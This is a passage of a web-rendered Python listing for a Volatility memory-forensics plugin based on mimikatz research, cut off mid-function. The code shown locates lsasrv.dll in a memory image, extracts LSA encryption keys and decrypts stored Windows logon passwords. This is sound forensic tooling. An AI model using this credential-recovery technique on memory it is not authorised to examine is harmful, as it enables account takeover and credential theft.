class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Volatility mimikatz plugin</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Based on the research made by Gentil_Kiwi for his mimikatz</span></span><br><span class="line"><span class="comment"># http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"><span class="comment"># https://code.google.com/p/mimikatz/</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: Francesco Picasso &lt;francesco.picasso@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This plugin is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment"># it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment"># the Free Software Foundation; either version 2 of the License, or</span></span><br><span class="line"><span class="comment"># (at your option) any later version.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This plugin is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment"># but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment"># GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment"># along with this plugin.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@author       : Francesco Picasso</span></span><br><span class="line"><span class="string">@license      : GPL 2 or later</span></span><br><span class="line"><span class="string">@contact      : francesco.picasso@gmail.com</span></span><br><span class="line"><span class="string">@organization : www.realitynet.it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> construct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> volatility.obj <span class="keyword">as</span> obj</span><br><span class="line"><span class="keyword">import</span> volatility.debug <span class="keyword">as</span> debug</span><br><span class="line"><span class="keyword">import</span> volatility.commands <span class="keyword">as</span> commands</span><br><span class="line"><span class="keyword">import</span> volatility.constants <span class="keyword">as</span> constants</span><br><span class="line"><span class="keyword">import</span> volatility.utils <span class="keyword">as</span> utils</span><br><span class="line"><span class="keyword">import</span> volatility.win32.tasks <span class="keyword">as</span> tasks</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Credential</span>():</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;TODO: add description here.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, module=<span class="string">&#x27;&#x27;</span>, username=<span class="string">&#x27;&#x27;</span>, domain=<span class="string">&#x27;&#x27;</span>, epwd=<span class="string">&#x27;&#x27;</span>, pwd=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    self.module = module</span><br><span class="line">    self.username = username</span><br><span class="line">    self.domain = domain</span><br><span class="line">    self.epwd = epwd</span><br><span class="line">    self.pwd = pwd</span><br><span class="line">    self.signature = module + username + domain + epwd.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">decrypt_epwd</span>(<span class="params">self, decryptor</span>):</span></span><br><span class="line">    <span class="keyword">if</span> self.epwd <span class="keyword">and</span> decryptor:</span><br><span class="line">      self.pwd = decryptor.decrypt(self.epwd)</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        self.pwd = self.pwd.decode(<span class="string">&#x27;utf-16-le&#x27;</span>).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">      <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        debug.warning(<span class="string">&#x27;[Credential:decrypt_epwd] unicode decode error&#x27;</span>)</span><br><span class="line">        self.pwd = self.pwd.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">self</span>):</span></span><br><span class="line">    debug.notice(<span class="string">&#x27;m&lt;&#123;&#125;&gt; u&lt;&#123;&#125;&gt; d&lt;&#123;&#125;&gt; ep&lt;&#123;&#125;&gt; p&lt;&#123;&#125;&gt;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        self.module, self.username, self.domain,</span><br><span class="line">        self.epwd.encode(<span class="string">&#x27;hex&#x27;</span>), self.pwd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Credentials</span>():</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;TODO: add description here.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">    self.credentials = []</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">add_credential</span>(<span class="params">self, credential</span>):</span></span><br><span class="line">    already_in = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> cred <span class="keyword">in</span> self.credentials:</span><br><span class="line">      <span class="keyword">if</span> cred.signature == credential.signature:</span><br><span class="line">        already_in = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> already_in:</span><br><span class="line">      self.credentials.append(credential)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MemoryScanner</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;An address space scanner based on scudette&#x27;s Yara Scanner&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, task</span>):</span></span><br><span class="line">    self.task = task</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">_find_first</span>(<span class="params">self, address_space, offset, maxlen, signature</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Raw memory scanner with overlap.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Allow some bytes for overlapping signatures</span></span><br><span class="line">    overlap = <span class="number">1024</span></span><br><span class="line">    i = offset</span><br><span class="line">    <span class="keyword">while</span> i &lt; offset + maxlen:</span><br><span class="line">      to_read = <span class="built_in">min</span>(</span><br><span class="line">        constants.SCAN_BLOCKSIZE + overlap, offset + maxlen - i)</span><br><span class="line">      block = address_space.zread(i, to_read)</span><br><span class="line">      <span class="keyword">if</span> block:</span><br><span class="line">        match = block.find(signature)</span><br><span class="line">        <span class="keyword">if</span> match &gt;= <span class="number">0</span>:</span><br><span class="line">          <span class="keyword">return</span> match</span><br><span class="line">      i += constants.SCAN_BLOCKSIZE</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">find_first</span>(<span class="params">self, offset, signature</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Find the first match using VADs. It retuns a VA.&quot;&quot;&quot;</span></span><br><span class="line">    task_as = self.task.get_process_address_space()</span><br><span class="line">    task_vads = self.task.get_vads(skip_max_commit = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> vad, __ <span class="keyword">in</span> task_vads:</span><br><span class="line">      <span class="keyword">if</span> offset &gt;= vad.Start <span class="keyword">and</span> offset &lt;= vad.Start + vad.Length:</span><br><span class="line">        position = self._find_first(task_as, vad.Start, vad.Length, signature)</span><br><span class="line">        <span class="keyword">if</span> position:</span><br><span class="line">          <span class="keyword">return</span> position + vad.Start</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MimikatzBase</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;The mimikatz base class, used to defined common attributes/methods.&quot;&quot;&quot;</span></span><br><span class="line">  SIZEOF_LONG = <span class="number">4</span></span><br><span class="line">  SIZEOF_PTR = <span class="literal">None</span></span><br><span class="line">  UNPACK_PTR = <span class="literal">None</span></span><br><span class="line">  UNPACK_LONG = <span class="string">&#x27;&lt;L&#x27;</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, task</span>):</span></span><br><span class="line">    self.task = task</span><br><span class="line">    self.task_as = task.get_process_address_space()</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_ptr</span>(<span class="params">self, pos</span>):</span></span><br><span class="line">    raw_data = self.task_as.zread(pos, self.SIZEOF_PTR)</span><br><span class="line">    <span class="keyword">if</span> raw_data:</span><br><span class="line">      <span class="keyword">return</span> struct.unpack(self.UNPACK_PTR, raw_data)[<span class="number">0</span>]</span><br><span class="line">      </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">self, pos, size</span>):</span></span><br><span class="line">    <span class="keyword">if</span> pos <span class="keyword">and</span> size:</span><br><span class="line">      <span class="keyword">return</span> self.task_as.zread(pos, size)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mimikatz_x86</span>(<span class="params">MimikatzBase</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;The mimikatz x86 base class.&quot;&quot;&quot;</span></span><br><span class="line">  SIZEOF_PTR = <span class="number">4</span></span><br><span class="line">  UNPACK_PTR = <span class="string">&#x27;&lt;L&#x27;</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, task</span>):</span></span><br><span class="line">    MimikatzBase.__init__(self, task)</span><br><span class="line">    MimikatzBase.__init__(self, task)</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_ptr_with_offset</span>(<span class="params">self, pos</span>):</span></span><br><span class="line">    <span class="keyword">return</span> self.get_ptr(pos)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mimikatz_x64</span>(<span class="params">MimikatzBase</span>):</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;The mimikatz x64 base class.&quot;&quot;&quot;</span></span><br><span class="line">  SIZEOF_PTR = <span class="number">8</span></span><br><span class="line">  UNPACK_PTR = <span class="string">&#x27;&lt;Q&#x27;</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, task</span>):</span></span><br><span class="line">    MimikatzBase.__init__(self, task)</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_ptr_with_offset</span>(<span class="params">self, pos</span>):</span></span><br><span class="line">    raw_data = self.task_as.zread(pos, self.SIZEOF_LONG)</span><br><span class="line">    <span class="keyword">if</span> raw_data:</span><br><span class="line">      ptr = struct.unpack(self.UNPACK_LONG, raw_data)[<span class="number">0</span>]</span><br><span class="line">      <span class="keyword">return</span> pos + self.SIZEOF_LONG + ptr</span><br><span class="line">    </span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------    </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LsaDecryptor</span>():</span></span><br><span class="line">  <span class="string">&quot;&quot;&quot;TODO: add description.&quot;&quot;&quot;</span></span><br><span class="line">  SIGNATURE = <span class="literal">None</span></span><br><span class="line">  IV_LENGTH = <span class="number">16</span></span><br><span class="line">  PTR_IV_OFFSET = <span class="literal">None</span></span><br><span class="line">  PTR_AES_KEY_OFFSET = <span class="literal">None</span></span><br><span class="line">  PTR_DES_KEY_OFFSET = <span class="literal">None</span></span><br><span class="line">  UUUR_TAG = <span class="number">0x55555552</span></span><br><span class="line">  MSSK_TAG = <span class="number">0x4d53534b</span></span><br><span class="line"></span><br><span class="line">  HARD_KEY = construct.Struct(<span class="string">&#x27;KIWI_HARD_KEY&#x27;</span>,</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;cbSecret&#x27;</span>),</span><br><span class="line">      construct.Field(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">lambda</span> ctx: ctx.cbSecret))</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Modified to include HARD_KEY size.</span></span><br><span class="line">  BCRYPT_KEY = construct.Struct(<span class="string">&#x27;KIWI_BCRYPT_KEY&#x27;</span>,</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;size&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;tag&#x27;</span>), <span class="comment"># &#x27;MSSK&#x27;.</span></span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;type&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;unk0&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;unk1&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;unk2&#x27;</span>),</span><br><span class="line">      construct.ULInt32(<span class="string">&#x27;cbSecret&#x27;</span>))</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">    self.iv = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    self.aes_key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    self.des_key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">find_signature</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">for</span> mod <span class="keyword">in</span> self.task.get_load_modules():</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">str</span>(mod.BaseDllName).lower() == <span class="string">&#x27;lsasrv.dll&#x27;</span>:</span><br><span class="line">        scanner = MemoryScanner(self.task)</span><br><span class="line">        <span class="keyword">return</span> scanner.find_first(mod.DllBase.v(), self.SIGNATURE)</span><br><span class="line">    debug.warning(<span class="string">&#x27;[LsaDecryptor:find_signature()] signature not found!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_IV</span>(<span class="params">self, pos</span>):</span></span><br><span class="line">    ptr_iv = self.get_ptr_with_offset(pos + self.PTR_IV_OFFSET)</span><br><span class="line">    <span class="keyword">if</span> ptr_iv:</span><br><span class="line">      <span class="keyword">return</span> self.get_data(ptr_iv, self.IV_LENGTH)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">self, pos, key_offset</span>):</span></span><br><span class="line">    ptr_key = self.get_ptr_with_offset(pos + key_offset)</span><br><span class="line">    <span class="keyword">if</span> ptr_key:</span><br><span class="line">      ptr_key = self.get_ptr(ptr_key)</span><br><span class="line">      <span class="keyword">if</span> ptr_key:</span><br><span class="line">        size = self.BCRYPT_HANDLE_KEY.sizeof()</span><br><span class="line">        data = self.get_data(ptr_key, size)</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">          kbhk = self.BCRYPT_HANDLE_KEY.parse(data)</span><br><span class="line">          <span class="keyword">if</span> kbhk.tag == self.UUUR_TAG:</span><br><span class="line">            ptr_key = kbhk.ptr_kiwi_bcrypt_key</span><br><span class="line">            size = self.BCRYPT_KEY.sizeof()</span><br><span class="line">            data = self.get_data(ptr_key, size)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">              kbk = self.BCRYPT_KEY.parse(data)</span><br><span class="line">              <span class="keyword">if</span> kbk.tag == self.MSSK_TAG:</span><br><span class="line">                adjust = construct.ULInt32(<span class="string">&#x27;&#x27;</span>).sizeof()</span><br><span class="line">                size = kbk.cbSecret + adjust</span><br><span class="line">                ptr_key = ptr_key + self.BCRYPT_KEY.sizeof() - adjust</span><br><span class="line">                data = self.get_data(ptr_key, size)</span><br><span class="line">                <span class="keyword">if</span> data:</span><br><span class="line">                  khk = self.HARD_KEY.parse(data)</span><br><span class="line">                  <span class="keyword">return</span> khk.data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                  debug.warning(<span class="string">&#x27;get_key() unable to get HARD_KEY.&#x27;</span>)</span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                debug.warning(<span class="string">&#x27;get_key() BCRYPT_KEY invalid tag&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">              debug.warning(<span class="string">&#x27;get_key() unable to read BCRYPT_KEY data.&#x27;</span>)</span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">            debug.warning(<span class="string">&#x27;get_key() BCRYPT_HANDLE_KEY invalid tag&#x27;</span>)</span><br><span class="line">            debug.warning(kbhk)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          debug.warning(<span class="string">&#x27;get_key() unable to read BCRYPT_HANDLE_KEY data.&#x27;</span>)</span><br><span class="line">      